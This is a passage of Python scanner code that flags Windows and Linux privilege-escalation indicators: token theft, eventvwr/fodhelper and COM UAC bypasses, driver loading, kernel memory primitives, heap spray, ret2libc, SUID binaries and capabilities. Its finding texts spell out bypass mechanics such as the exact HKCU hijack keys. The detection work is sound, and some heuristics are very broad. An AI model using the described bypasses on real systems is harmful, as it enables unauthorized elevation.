    # another user's token obtained via pipe trick or LogonUser handle.
    for _sym in (b"ImpersonateLoggedOnUser", b"ImpersonateNamedPipeClient"):
        if _sym in binary_data:
            findings.append({
                "severity": "CRITICAL",
                "title": "TOKEN_IMPERSONATION",
                "detail": (
                    f"Binary imports {_sym.decode()} — user context hijack; "
                    "allows the process to impersonate a logged-on user or the "
                    "client of a named pipe, assuming their security context for "
                    "subsequent resource access; exploited in token relay attacks "
                    "(potato variants) and service-level privilege escalation where "
                    "the pipe client is a SYSTEM-level service; the impersonated "
                    "token grants full access to any resource the victim holds"
                ),
                "host": "localhost",
                "port": 0,
            })
            break  # one finding even if both symbols present

    # --- CRITICAL: DuplicateTokenEx + CreateProcessWithTokenW ---
    # Token theft chain: duplicate a stolen/impersonated token to primary type,
    # then spawn a new process running under that token's identity.
    if b"DuplicateTokenEx" in binary_data and b"CreateProcessWithTokenW" in binary_data:
        findings.append({
            "severity": "CRITICAL",
            "title": "TOKEN_DUPLICATION_EXEC",
            "detail": (
                "Binary imports DuplicateTokenEx and CreateProcessWithTokenW — "
                "process spawned with stolen token; attacker duplicates an "
                "impersonated or stolen token to create a primary token via "
                "DuplicateTokenEx, then passes it to CreateProcessWithTokenW to "
                "launch an arbitrary process under the victim's security context; "
                "net result: privileged process execution (commonly SYSTEM) without "
                "credentials, bypassing all subsequent authentication checks"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- HIGH: SeDebugPrivilege string reference ---
    # PMA Ch.11: the named privilege passed to LookupPrivilegeValueA; its
    # presence in a binary is a strong indicator of intentional privilege escalation.
    if b"SeDebugPrivilege" in binary_data:
        findings.append({
            "severity": "HIGH",
            "title": "SEDEBUG_PRIVILEGE",
            "detail": (
                "Binary contains the string 'SeDebugPrivilege' — system-level "
                "debug rights; this privilege is held by default only by local "
                "administrators and grants the holder read/write access to any "
                "process memory regardless of its security descriptor; PMA Ch.11 "
                "documents this as the gateway privilege enabling all subsequent "
                "system-process injection and token theft; granting SeDebugPrivilege "
                "is functionally equivalent to conferring LocalSystem account access"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- HIGH: LookupPrivilegeValue + TOKEN_ADJUST_PRIVILEGES ---
    # Two-step privilege manipulation: resolve the LUID for a named privilege,
    # then pass it to AdjustTokenPrivileges with the TOKEN_ADJUST_PRIVILEGES mask.
    _has_lookup = (
        b"LookupPrivilegeValueA" in binary_data
        or b"LookupPrivilegeValueW" in binary_data
        or b"LookupPrivilegeValue" in binary_data
    )
    if _has_lookup and b"TOKEN_ADJUST_PRIVILEGES" in binary_data:
        findings.append({
            "severity": "HIGH",
            "title": "PRIVILEGE_LOOKUP_ADJUST",
            "detail": (
                "Binary imports LookupPrivilegeValue and references "
                "TOKEN_ADJUST_PRIVILEGES — privilege manipulation sequence; "
                "LookupPrivilegeValue resolves the locally unique identifier (LUID) "
                "for a named privilege such as SeDebugPrivilege or SeTcbPrivilege; "
                "the LUID is then passed to AdjustTokenPrivileges with the "
                "TOKEN_ADJUST_PRIVILEGES access mask to enable or disable the "
                "privilege in the process token; this two-step pattern is the "
                "standard programmatic method for all token-based privilege escalation"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


def detect_uac_bypass_indicators(binary_data: bytes) -> list:
    """Detect UAC bypass indicators in binary data.

    Synthesized from: Practical Malware Analysis Ch.11 (privilege escalation via
    Windows auto-elevate mechanisms, registry hijack) and UAC bypass research on
    eventvwr/fodhelper registry hijack patterns and COM interface elevation.

    Args:
        binary_data: Raw bytes of a PE binary or memory dump.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    import re as _re

    findings = []

    # --- CRITICAL: eventvwr.exe + HKCU registry hijack path ---
    # Classic UAC bypass: eventvwr is auto-elevate and reads the mscfile handler
    # from a user-writable HKCU key; no elevation prompt shown to the user.
    _has_eventvwr = b"eventvwr.exe" in binary_data
    _has_mscfile = (
        b"HKCU\\Software\\Classes\\mscfile" in binary_data
        or b"HKCU\\\\Software\\\\Classes\\\\mscfile" in binary_data
        or b"Software\\Classes\\mscfile" in binary_data
    )
    if _has_eventvwr and _has_mscfile:
        findings.append({
            "severity": "CRITICAL",
            "title": "UAC_BYPASS_EVENTVWR",
            "detail": (
                "Binary references 'eventvwr.exe' and the registry path "
                "HKCU\\Software\\Classes\\mscfile — classic eventvwr UAC bypass; "
                "eventvwr.exe is an auto-elevating Windows binary that resolves "
                "its msc file handler from the user-writable HKCU key "
                "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command; "
                "by writing a malicious executable path to this key, the malware "
                "causes eventvwr to launch the payload at high integrity without "
                "displaying a UAC consent dialog"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- CRITICAL: fodhelper.exe ---
    # Windows 10 auto-elevate binary; reads ms-settings handler from writable HKCU key.
    if b"fodhelper.exe" in binary_data:
        findings.append({
            "severity": "CRITICAL",
            "title": "UAC_BYPASS_FODHELPER",
            "detail": (
                "Binary references 'fodhelper.exe' — Windows 10 Optional Features "
                "Manager UAC bypass; fodhelper is marked autoElevate in its manifest "
                "and reads HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command "
                "to locate its handler; this HKCU key is user-writable, allowing "
                "malware to place a payload path there and trigger execution at high "
                "integrity via fodhelper without a UAC prompt; works on default "
                "Windows 10/11 configurations with UAC set to the default notify level"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- CRITICAL: ICMLuaUtil or IColorDataProxy COM interface ---
    # Elevated COM object bypass: these interfaces are exposed by auto-elevated
    # COM servers and can be used to execute arbitrary commands at high integrity.
    for _iface in (b"ICMLuaUtil", b"IColorDataProxy"):
        if _iface in binary_data:
            findings.append({
                "severity": "CRITICAL",
                "title": "UAC_BYPASS_COM_INTERFACE",
                "detail": (
                    f"Binary references COM interface '{_iface.decode()}' — UAC bypass "
                    "via elevated COM object; ICMLuaUtil and IColorDataProxy are "
                    "interfaces exposed by auto-elevating COM servers in Windows; "
                    "instantiating these objects via CoCreateInstance triggers COM "
                    "elevation which grants the caller a proxy running at high "
                    "integrity; the proxy can then execute arbitrary commands without "
                    "a UAC dialog; technique bypasses all UAC settings except "
                    "'Always notify' and leaves minimal forensic trace compared to "
                    "registry hijack methods"
                ),
                "host": "localhost",
                "port": 0,
            })
            break  # one finding even if both interfaces present

    # --- HIGH: ShellExecute + runas verb ---
    # Explicit elevation request; triggers a UAC prompt but relies on user approval
    # or social engineering; also used dynamically when other bypass paths fail.
    if b"ShellExecute" in binary_data and b"runas" in binary_data:
        findings.append({
            "severity": "HIGH",
            "title": "RUNAS_ESCALATION",
            "detail": (
                "Binary imports ShellExecute and contains the string 'runas' — "
                "explicit elevation request; passing 'runas' as the lpOperation "
                "parameter to ShellExecuteEx triggers a UAC elevation dialog "
                "requesting administrator access; while the user sees the UAC "
                "prompt, this path is used by malware relying on social engineering "
                "to obtain approval, or as a fallback when silent bypass techniques "
                "fail; also used as a dynamic elevation probe combined with "
                "conditional logic selecting between bypass methods at runtime"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- HIGH: autoElevate manifest attribute ---
    # The autoElevate attribute in an embedded application manifest marks the
    # binary as eligible for automatic elevation without a UAC prompt on whitelisted paths.
    if _re.search(rb"autoElevate", binary_data, _re.IGNORECASE):
        findings.append({
            "severity": "HIGH",
            "title": "AUTO_ELEVATE_MANIFEST",
            "detail": (
                "Binary contains 'autoElevate' in an embedded manifest — "
                "self-elevating binary indicator; the autoElevate manifest attribute "
                "instructs Windows to automatically elevate the binary to high "
                "integrity without a UAC consent dialog when UAC is set below "
                "'Always notify'; Microsoft applies this to a whitelist of system "
                "binaries (eventvwr, fodhelper, etc.); presence in a non-system "
                "binary indicates either a crafted manifest designed to abuse "
                "auto-elevation or a binary masquerading as a whitelisted system "
                "component to gain silent elevation without user interaction"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


def detect_driver_exploitation(binary_data: bytes) -> list:
    """Detect kernel driver loading and IOCTL-based attack primitives in a binary.

    Sources: PMA ch10 'Drivers and Kernel Code' (device objects, DeviceIoControl as
    the primary user-to-driver request mechanism, DriverEntry callback registration),
    'Loading Drivers' (SCM-based driver registration via RegisterService/StartService),
    'Kernel Issues for Windows Vista/7/x64' (driver signing enforcement, NtLoadDriver
    as the low-level loader bypassing SCM checks).  Nt/Zw prefix equivalence documented
    in ch7 'The Native API'.
    """
    import re as _re

    findings = []

    # --- CRITICAL: NtLoadDriver / ZwLoadDriver ---
    # NtLoadDriver is the Native API syscall that loads a kernel driver directly,
    # bypassing the Service Control Manager.  ZwLoadDriver is the kernel-mode alias
    # (Nt/Zw behave identically in user space per PMA ch7).  Presence in a user-space
    # binary indicates direct driver injection without SCM registration; this is the
    # canonical rootkit loader path used to avoid leaving SCM registry artifacts.
    if b"NtLoadDriver" in binary_data or b"ZwLoadDriver" in binary_data:
        sym = b"NtLoadDriver" if b"NtLoadDriver" in binary_data else b"ZwLoadDriver"
        findings.append({
            "severity": "CRITICAL",
            "title": "DRIVER_LOAD_SYSCALL",
            "detail": (
                f"Binary references '{sym.decode()}' — kernel driver loading via "
                "Native API syscall; NtLoadDriver/ZwLoadDriver load a .sys image "
                "directly into the kernel without registering a service through the "
                "Service Control Manager, bypassing SCM audit trail and driver-load "
                "event logging; this is the primary rootkit installation primitive "
                "documented in PMA ch10 — once loaded, the driver's DriverEntry "
                "registers callback functions and creates device objects accessible "
                "from user space; on x64 Vista+ the call will fail unless driver "
                "signing is disabled via BCDEdit nointegritychecks, but on x86 "
                "targets this succeeds silently; chain with CreateFile to a "
                "'\\\\.\\device' path to confirm active IOCTL communication"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- HIGH: DeviceIoControl + suspicious IOCTL code constants (0x22xxxx) ---
    # DeviceIoControl is the standard user-space mechanism for sending arbitrary
    # requests to a kernel driver device object (PMA ch10: 'the most commonly
    # encountered request for a malicious kernel component').  IOCTL codes in the
    # 0x220000-0x22FFFF range use device type 0x22 (FILE_DEVICE_UNKNOWN), the
    # conventional type for custom/private driver interfaces not tied to real hardware.
    # Presence of both the API import and a 0x22xxxx constant strongly indicates
    # direct driver communication for privilege escalation or memory read/write.
    if b"DeviceIoControl" in binary_data:
        ioctl_hit = _re.search(rb"\x00\x22[\x00-\xff][\x00-\xff]", binary_data)
        if not ioctl_hit:
            # also catch little-endian DWORD constants 0x0022xxxx stored as 4 bytes
            ioctl_hit = _re.search(
                rb"[\x00-\xff][\x00-\xff]\x22\x00", binary_data
            )
        if ioctl_hit:
            findings.append({
                "severity": "HIGH",
                "title": "DEVICE_IOCTL_CALL",
                "detail": (
                    "Binary imports DeviceIoControl and contains IOCTL code constants "
                    "in the 0x22xxxx range (FILE_DEVICE_UNKNOWN device type) — "
                    "direct kernel driver IOCTL interaction; DeviceIoControl is the "
                    "primary user-to-driver communication channel per PMA ch10, used "
                    "by malware to send arbitrary input buffers to a kernel driver and "
                    "receive output; 0x22xxxx codes indicate a custom/private driver "
                    "interface rather than a documented hardware driver; this pattern "
                    "is seen in privilege escalation tooling that uses a vulnerable "
                    "signed driver (BYOVD) or a self-loaded rootkit driver to execute "
                    "kernel-mode code on behalf of a user-space process; pair with "
                    "NtLoadDriver or SCM indicators to confirm the full load-then-use chain"
                ),
                "host": "localhost",
                "port": 0,
            })

    # --- CRITICAL: CreateFile + physical memory device path ---
    # Opening \\.\PHYSICALMEMORY (or case variant PhysicalMemory) grants read/write
    # access to the entire physical address space from user mode on Windows XP and
    # earlier; patched in XP SP2 but still attempted by exploit code targeting older
    # systems or via driver-assisted reads.  PMA ch10 documents physical memory access
    # as a rootkit primitive for reading kernel structures without a loaded driver.
    if b"CreateFile" in binary_data or b"CreateFileW" in binary_data or b"CreateFileA" in binary_data:
        phys_hit = (
            b"PHYSICALMEMORY" in binary_data.upper()
            or b"\\\\.\\PhysicalMemory" in binary_data
            or b"\\\\.\\PHYSICALMEMORY" in binary_data
        )
        if phys_hit:
            findings.append({
                "severity": "CRITICAL",
                "title": "PHYSICAL_MEMORY_DEVICE",
                "detail": (
                    "Binary combines CreateFile with a '\\\\.\\\\ PhysicalMemory' "
                    "device path — direct physical memory access via device object; "
                    "opening this device from user space grants read/write access to "
                    "the entire physical address space, enabling arbitrary kernel "
                    "memory reads and writes without a loaded kernel driver; this "
                    "technique was documented in rootkit research and patched in "
                    "Windows XP SP2 (object ACL tightened), but exploit code "
                    "targeting older systems or combined with a token impersonation "
                    "exploit can still succeed; adversaries use this path to read "
                    "the EPROCESS chain, locate the System process token, and copy "
                    "it into the current process — a direct kernel object manipulation "
                    "privilege escalation requiring no kernel code execution"
                ),
                "host": "localhost",
                "port": 0,
            })

    # --- HIGH: SCM + kernel driver installation indicators ---
    # The Service Control Manager is the documented path for loading kernel drivers
    # (PMA ch10 'Loading Drivers': RegisterService + StartService via OSR loader or
    # equivalent SCM API calls — CreateService with SERVICE_KERNEL_DRIVER type then
    # StartService).  Presence of SCM-related strings alongside .sys extension
    # references or the word 'kernel' indicates driver installation through the
    # sanctioned but audited SCM path, which requires SeLoadDriverPrivilege.
    scm_hit = (
        b"OpenSCManager" in binary_data
        or b"CreateService" in binary_data
        or b"StartService" in binary_data
        or b"SCM" in binary_data
    )
    kernel_driver_ref = b".sys" in binary_data or b"kernel" in binary_data.lower()
    if scm_hit and kernel_driver_ref:
        findings.append({
            "severity": "HIGH",
            "title": "KERNEL_DRIVER_INSTALL",
            "detail": (
                "Binary references Service Control Manager APIs (OpenSCManager / "
                "CreateService / StartService) alongside kernel driver indicators "
                "('.sys' extension or 'kernel' string) — driver installation via "
                "SCM; the documented driver load path per PMA ch10 uses "
                "CreateService with dwServiceType=SERVICE_KERNEL_DRIVER then "
                "StartService to load a .sys image into the kernel; this requires "
                "SeLoadDriverPrivilege (granted to local administrators by default) "
                "and creates a detectable registry artifact under "
                "HKLM\\SYSTEM\\CurrentControlSet\\Services; malware using this path "
                "typically pairs it with registry cleanup on unload to remove the "
                "service entry; on x64 Vista+ the driver must be signed unless "
                "BCDEdit nointegritychecks is set — unsigned driver load attempts "
                "via SCM will return ERROR_INVALID_IMAGE_HASH"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


def detect_kernel_memory_read(binary_data: bytes) -> list:
    """Detect kernel memory mapping and pool allocation primitives in user-space binaries.

    Sources: PMA ch10 'Rootkits' (SSDT hooking, MmGetSystemRoutineAddress, kernel
    symbol resolution at runtime), 'Kernel vs. User Mode' (kernel-mode code shares
    all memory, no security checks), ch7 'The Native API' (NtQuerySystemInformation
    family for system state queries, SystemKernelDebuggerInformation class).
    Kernel pool and affinity APIs appear in user-space binaries only when the binary
    embeds shellcode or a kernel payload inline, or when analyzing a driver that has
    been incorrectly classified as a user-space PE.
    """
    findings = []

    # --- CRITICAL: NtQuerySystemInformation + SystemKernelDebuggerInformation ---
    # NtQuerySystemInformation is documented in PMA ch7 as a Native API function that
    # exposes far more system detail than any Win32 equivalent.  The information class
    # SystemKernelDebuggerInformation (0x23) returns whether a kernel debugger is
    # active (KdDebuggerEnabled, KdDebuggerNotPresent flags).  Malware queries this
    # before attempting SSDT hooks or other kernel patches that would crash the system
    # if a kernel debugger is attached (PMA ch10: PatchGuard causes a system crash if
    # a debugger is attached after boot on x64).  Co-occurrence of both strings
    # indicates anti-analysis targeting of kernel debugging environments.
    if (
        b"NtQuerySystemInformation" in binary_data
        and b"SystemKernelDebuggerInformation" in binary_data
    ):
        findings.append({
            "severity": "CRITICAL",
            "title": "KERNEL_DEBUGGER_QUERY",
            "detail": (
                "Binary references NtQuerySystemInformation alongside "
                "'SystemKernelDebuggerInformation' — querying kernel debugger state "
                "to select exploit target; NtQuerySystemInformation with information "
                "class 0x23 (SystemKernelDebuggerInformation) returns "
                "KdDebuggerEnabled and KdDebuggerNotPresent flags indicating whether "
                "a kernel debugger is actively attached; this check gates kernel "
                "patching operations (SSDT hooks, IDT modifications, inline patches) "
                "that would trigger PatchGuard BSODs on x64 systems when a debugger "
                "is present (PMA ch10); presence in a user-space binary indicates "
                "pre-exploit reconnaissance targeting the kernel attack surface; "
                "also used as an anti-analysis check to detect dynamic analysis "
                "environments where kernel debugging is standard practice"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- CRITICAL: MmMapLockedPages / MmMapLockedPagesSpecifyCache ---
    # These kernel-mode memory manager functions map MDL-locked physical pages into
    # a virtual address range.  They are exclusively kernel-mode APIs exported by
    # ntoskrnl.exe — a user-space binary containing these strings has either embedded
    # a kernel payload (shellcode or a driver image) inline, or is resolving them
    # dynamically via MmGetSystemRoutineAddress (documented in PMA ch10 rootkit
    # example) to map physical memory into kernel virtual space for read/write access.
    mm_hit = (
        b"MmMapLockedPagesSpecifyCache" in binary_data
        or b"MmMapLockedPages" in binary_data
    )
    if mm_hit:
        sym = (
            b"MmMapLockedPagesSpecifyCache"
            if b"MmMapLockedPagesSpecifyCache" in binary_data
            else b"MmMapLockedPages"
        )
        findings.append({
            "severity": "CRITICAL",
            "title": "KERNEL_LOCKED_PAGE_MAP",
            "detail": (
                f"Binary contains kernel memory manager symbol '{sym.decode()}' — "
                "mapping MDL-locked kernel pages into virtual address space; "
                "MmMapLockedPages and MmMapLockedPagesSpecifyCache are ntoskrnl.exe "
                "kernel-mode exports with no user-mode equivalent; their presence "
                "in a user-space binary indicates an embedded kernel payload "
                "(driver shellcode or a full .sys image carried inline) or dynamic "
                "kernel symbol resolution via MmGetSystemRoutineAddress as seen in "
                "SSDT-hooking rootkits (PMA ch10); these functions create a kernel "
                "virtual mapping of physically locked pages, enabling read/write "
                "access to arbitrary kernel structures including the EPROCESS chain, "
                "SSDT table, and IDT — the three primary kernel attack surfaces "
                "documented across PMA chapters 7 and 10"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- HIGH: ExAllocatePoolWithTag in user-space binary ---
    # ExAllocatePoolWithTag allocates memory from the kernel pool (NonPagedPool or
    # PagedPool) and is a core kernel-mode allocator exported by ntoskrnl.exe.
    # It has no user-mode equivalent.  A user-space binary referencing this string
    # either carries an embedded kernel driver/shellcode payload or was built with
    # kernel headers and imports resolved incorrectly — both scenarios indicate
    # kernel-mode code mixed into a user-space binary, which is a strong indicator
    # of a dropper that delivers and executes a kernel payload at runtime.
    if b"ExAllocatePoolWithTag" in binary_data:
        findings.append({
            "severity": "HIGH",
            "title": "KERNEL_POOL_ALLOC",
            "detail": (
                "Binary contains 'ExAllocatePoolWithTag' — kernel pool allocation "
                "reference in a user-space binary; ExAllocatePoolWithTag is a "
                "ntoskrnl.exe kernel-mode export that allocates NonPagedPool or "
                "PagedPool memory with a four-byte tag for leak tracking; it has "
                "no user-mode counterpart and cannot be called from user space "
                "without a driver intermediary; its presence indicates either an "
                "embedded kernel driver payload carried inline (dropper pattern) or "
                "a user-space binary that resolves this symbol dynamically via "
                "MmGetSystemRoutineAddress to pass to a loaded driver through an "
                "IOCTL interface; kernel pool allocation is a prerequisite for "
                "nearly all kernel data structure manipulation — SSDT entry "
                "replacement, fake EPROCESS insertion, and kernel callback "
                "registration all require pool-allocated backing memory"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- HIGH: KeSetSystemAffinityThread / KeRevertToUserAffinityThread ---
    # These ntoskrnl.exe exports pin a thread to a specific processor and revert
    # the affinity to the original user-specified mask.  They appear in exploit code
    # that pins execution to a single CPU to avoid race conditions during kernel
    # structure modification (e.g., SSDT hook installation, which involves a
    # non-atomic read-modify-write on the SSDT table entry).  PMA ch10 rootkit
    # analysis: SSDT hook installation at a single address requires that no other
    # CPU execute through that SSDT entry during the write — thread affinity pinning
    # is the standard primitive used to enforce this invariant in kernel payloads.
    affinity_hit = (
        b"KeSetSystemAffinityThread" in binary_data
        or b"KeRevertToUserAffinityThread" in binary_data
    )
    if affinity_hit:
        findings.append({
            "severity": "HIGH",
            "title": "KERNEL_AFFINITY_THREAD",
            "detail": (
                "Binary references KeSetSystemAffinityThread or "
                "KeRevertToUserAffinityThread — kernel thread affinity manipulation; "
                "these ntoskrnl.exe exports pin a thread to a specified processor "
                "set and restore the original affinity; in kernel exploit code this "
                "pair brackets non-atomic kernel structure writes (SSDT entry "
                "replacement, IDT handler swap, inline kernel patch) to prevent "
                "race conditions on multiprocessor systems where another CPU could "
                "read a partially written pointer during the modification window; "
                "their presence in a user-space binary indicates an embedded kernel "
                "payload that performs SSDT or IDT manipulation (PMA ch10 rootkit "
                "pattern), or a dropper that passes these symbol addresses into a "
                "kernel driver via IOCTL to execute the patch from driver context; "
                "combined with ExAllocatePoolWithTag or MmMapLockedPages indicators "
                "this constitutes a complete kernel memory manipulation primitive set"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


def detect_aslr_bypass_techniques(binary_data: bytes) -> list:
    """Detect ASLR bypass primitives: info-leak patterns, heap spray, ret2libc,
    and mprotect-after-write (NX/W^X bypass)."""
    import re
    findings = []

    # --- HIGH: information leak pattern for ASLR defeat ---
    # recv/read into buffer followed by printf with %p or an arithmetic address
    # calculation: the binary receives data into a local buffer and then prints a
    # pointer value or computed address — the classic format-string or direct-pointer
    # leak path that defeats ASLR by disclosing a loaded base address to the attacker.
    info_leak = (
        (b"recv" in binary_data or b"read" in binary_data)
        and (b"printf" in binary_data or b"fprintf" in binary_data or b"sprintf" in binary_data)
        and (b"%p" in binary_data or b"%lx" in binary_data or b"%llx" in binary_data)
    )
    if info_leak:
        findings.append({
            "severity": "HIGH",
            "title": "ASLR_INFO_LEAK_PATTERN",
            "detail": (
                "format string or direct pointer leak (ASLR defeat) — binary "
                "contains recv/read into buffer combined with printf-family call "
                "using %%p / %%lx / %%llx format specifier; this pattern discloses "
                "a loaded address to the attacker, defeating ASLR by providing the "
                "base offset needed to compute gadget or libc symbol addresses"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- CRITICAL: heap spray for ASLR bypass ---
    # HeapAlloc + memset over a large block, combined with a repeated alloc pattern
    # and a spray constant (0x0c0c0c0c is the canonical Windows heap-spray nop-sled
    # constant; 0x41414141 / 0x90909090 appear in cross-platform variants).  The
    # combination indicates the binary floods the heap with attacker-controlled data
    # at a predictable address range, allowing RIP control without knowing the exact
    # ASLR slide.
    spray_constants = [b"\x0c\x0c\x0c\x0c", b"\x41\x41\x41\x41", b"\x90\x90\x90\x90"]
    heap_spray = (
        (b"HeapAlloc" in binary_data or b"VirtualAlloc" in binary_data or b"mmap" in binary_data)
        and b"memset" in binary_data
        and any(c in binary_data for c in spray_constants)
    )
    if heap_spray:
        findings.append({
            "severity": "CRITICAL",
            "title": "HEAP_SPRAY_ASLR_BYPASS",
            "detail": (
                "heap spray for ASLR bypass (predictable address range) — binary "
                "references HeapAlloc/VirtualAlloc/mmap combined with memset and a "
                "known spray constant (0x0c0c0c0c / 0x41414141 / 0x90909090); "
                "the pattern floods the heap with attacker-controlled content at a "
                "statistically predictable range, enabling reliable code-execution "
                "without knowing the precise ASLR slide"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- CRITICAL: ret2libc pattern ---
    # system() or execve() present, /bin/sh string present, and a stack-overflow
    # indicator (gets / strcpy / strcat without bounds, or a large alloca pattern).
    # Proximity of system + /bin/sh + an unbounded copy is the canonical ret2libc
    # setup: attacker overwrites the return address with the address of system() and
    # places a pointer to "/bin/sh" as the argument — works against NX because it
    # reuses existing executable code in libc rather than injecting shellcode.
    has_system_exec = b"system" in binary_data or b"execve" in binary_data
    has_binsh = b"/bin/sh" in binary_data or b"/bin/bash" in binary_data
    has_overflow_primitive = (
        b"gets" in binary_data
        or b"strcpy" in binary_data
        or b"strcat" in binary_data
        or b"sprintf" in binary_data
        or b"scanf" in binary_data
    )
    if has_system_exec and has_binsh and has_overflow_primitive:
        findings.append({
            "severity": "CRITICAL",
            "title": "RET2LIBC_PATTERN",
            "detail": (
                "return-to-libc technique (ASLR bypass via known lib base) — "
                "binary contains system/execve, a /bin/sh or /bin/bash string, "
                "and an unbounded copy primitive (gets/strcpy/strcat/sprintf/scanf); "
                "an attacker who controls the return address can redirect execution "
                "to system() with /bin/sh as the argument without injecting shellcode, "
                "bypassing NX; ASLR is defeated by leaking or brute-forcing the "
                "libc base address"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- CRITICAL: mprotect after write (NX/W^X bypass) ---
    # mprotect present alongside a write primitive (write/memcpy/recv into a mapped
    # region), indicating the binary changes memory region permissions after writing
    # attacker-controlled data — the standard technique for making a non-executable
    # region executable so that injected shellcode can run despite NX/W^X policy.
    has_mprotect = b"mprotect" in binary_data
    has_write_primitive = (
        b"write" in binary_data
        or b"memcpy" in binary_data
        or b"memmove" in binary_data
        or b"recv" in binary_data
    )
    if has_mprotect and has_write_primitive:
        findings.append({
            "severity": "CRITICAL",
            "title": "MPROTECT_AFTER_WRITE",
            "detail": (
                "mprotect called post-write (NX/W^X bypass) — binary references "
                "mprotect alongside a write primitive (write/memcpy/memmove/recv); "
                "the pattern changes memory region permissions to PROT_EXEC after "
                "writing attacker-controlled data into that region, enabling shellcode "
                "execution in a region that was initially non-executable; defeats "
                "kernel NX (DEP) and W^X enforcement"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


def check_suid_binary_chain(target_dir: str = "/") -> list:
    """Walk target_dir for SUID binaries.  Flag known-exploitable names
    (gtfobins list), SUID binaries writable by the current user, and SUID
    binaries residing in world-writable directories."""
    import os
    import stat
    findings = []

    # GTFOBins-derived list of binaries with documented SUID escalation primitives.
    KNOWN_EXPLOITABLE = {
        "find", "perl", "python", "python2", "python3",
        "ruby", "vim", "vi", "less", "more", "nano", "man",
        "env", "cp", "mv", "awk", "nmap", "bash", "dash",
        "sh", "ash", "ksh", "tclsh", "lua", "node",
    }

    for dirpath, _dirnames, filenames in os.walk(target_dir):
        for fname in filenames:
            fpath = os.path.join(dirpath, fname)
            try:
                st = os.stat(fpath)
            except OSError:
                continue

            # Only interested in files with the SUID bit set.
            if not (st.st_mode & stat.S_ISUID):
                continue

            # --- CRITICAL: known GTFOBins escalation primitive ---
            name_lower = fname.lower()
            # strip version suffixes like python3.11 -> python3
            base_name = name_lower.split(".")[0]
            if base_name in KNOWN_EXPLOITABLE or name_lower in KNOWN_EXPLOITABLE:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "SUID_EXPLOITABLE_BINARY",
                    "detail": (
                        f"{fname} has SUID bit (known gtfobins escalation primitive) "
                        f"at {fpath} — this binary is listed on GTFOBins with a "
                        "documented SUID-mode privilege escalation technique; "
                        "an unprivileged user can invoke it to spawn a root shell "
                        "or read/write arbitrary files as root"
                    ),
                    "host": "localhost",
                    "port": 0,
                })

            # --- CRITICAL: SUID binary writable by current user ---
            try:
                if os.access(fpath, os.W_OK):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "SUID_WRITABLE",
                        "detail": (
                            f"SUID binary writable by current user at {fpath} — "
                            "the file has the SUID bit set but is also writable "
                            "by the running process; an attacker can overwrite the "
                            "binary with arbitrary code that executes as the file "
                            "owner (typically root)"
                        ),
                        "host": "localhost",
                        "port": 0,
                    })
            except OSError:
                pass

            # --- CRITICAL: SUID binary in world-writable directory ---
            try:
                dir_st = os.stat(dirpath)
                if dir_st.st_mode & stat.S_IWOTH:
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "SUID_IN_WRITABLE_DIR",
                        "detail": (
                            f"SUID binary in world-writable directory (hijack surface) "
                            f"at {fpath} — the containing directory {dirpath} is "
                            "world-writable; an attacker can replace or shadow the "
                            "SUID binary (e.g., via PATH manipulation or direct "
                            "overwrite of the directory entry) to achieve privilege "
                            "escalation to the binary's owner"
                        ),
                        "host": "localhost",
                        "port": 0,
                    })
            except OSError:
                pass

    return findings


def detect_linux_capability_abuse() -> list:
    """Detect Linux capabilities (CapEff in /proc/<pid>/status) that enable
    privilege escalation without full root, file capabilities on common
    interpreter/utility binaries (via security.capability xattr), and the
    kernel unprivileged user-namespace policy.

    Informed by Gray Hat Hacking Ch. 12 (Linux Kernel Exploits) — capabilities
    are the primary lever for namespace-based kernel exploitation chains
    (DirtyPipe, nftables CVEs) and user-space privilege escalation without
    the SUID bit.
    """
    import struct

    findings = []

    # Linux capability bit positions (capability.h)
    CAP_CHOWN          = 0
    CAP_DAC_OVERRIDE   = 1
    CAP_DAC_READ_SEARCH = 2
    CAP_SETUID         = 7
    CAP_NET_ADMIN      = 12
    CAP_SYS_PTRACE     = 19
    CAP_SYS_ADMIN      = 21

    # (bit, severity, title, description fragment)
    CAP_CHECKS = [
        (
            CAP_SYS_ADMIN, "CRITICAL", "PROCESS_CAP_SYS_ADMIN",
            "broad kernel administration — mounting filesystems, loading kernel "
            "modules, namespace operations, and device ioctl; functionally "
            "equivalent to root in most exploitation contexts"
        ),
        (
            CAP_SETUID, "CRITICAL", "PROCESS_CAP_SETUID",
            "arbitrary UID changes; the process can call setuid(0) to become "
            "root or impersonate any other user on the system"
        ),
        (
            CAP_SYS_PTRACE, "HIGH", "PROCESS_CAP_PTRACE",
            "ptrace of any process regardless of owner; enables in-memory "
            "credential extraction (e.g. /proc/<pid>/mem writes) and arbitrary "
            "code injection into privileged processes"
        ),
        (
            CAP_NET_ADMIN, "HIGH", "PROCESS_CAP_NET_ADMIN",
            "full network stack administration including packet capture, "
            "firewall rule modification, routing table writes, and raw socket "
            "creation — network-level pivot and interception primitive"
        ),
        (
            CAP_DAC_OVERRIDE, "HIGH", "PROCESS_CAP_DAC_OVERRIDE",
            "bypass of DAC file permissions; the process can read or write any "
            "file on the system regardless of owner/group/mode bits"
        ),
        (
            CAP_CHOWN, "HIGH", "PROCESS_CAP_CHOWN",
            "arbitrary file ownership changes; the process can take ownership "
            "of any file including /etc/shadow and SUID binaries"
        ),
    ]

    # --- Per-process CapEff scan ---
    try:
        proc_entries = os.listdir("/proc")
    except OSError:
        proc_entries = []

    for entry in proc_entries:
